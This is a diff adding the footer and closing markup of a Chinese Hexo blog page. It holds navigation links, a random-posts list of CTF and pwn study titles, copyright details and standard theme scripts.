+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/posts/2bb7953f.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/posts/d7e2e20f.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/d1a08bca.html" title="pwn学习笔记（12）--Chunk Extend and Overlapping">pwn学习笔记（12）--Chunk Extend and Overlapping</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
+</div>
+
+    <span><a href="/posts/3d5d6561.html" title="三、Servlet基础">三、Servlet基础</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Misc/" title="分类于 杂七杂八的知识点">杂七杂八的知识点</a>
+</div>
+
+    <span><a href="/posts/d63a55bd.html" title="BUUCTF-Misc-第一页(1-16)">BUUCTF-Misc-第一页(1-16)</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/4bf5e0ee.html" title="【2024】LitCTF">【2024】LitCTF</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+</div>
+
+    <span><a href="/posts/ef2fddc9.html" title="arcaea闲谈">arcaea闲谈</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/a4378bd0.html" title="【2025】LitCTF">【2025】LitCTF</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/52965aaa.html" title="pwn学习笔记（4）ret2libc">pwn学习笔记（4）ret2libc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/ad175165.html" title="ctfshow-文件包含">ctfshow-文件包含</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/9b0d93f7.html" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/d7e2e20f.html" title="pwn学习笔记（0）-事后补充">pwn学习笔记（0）-事后补充</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'posts/2f610211.html',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
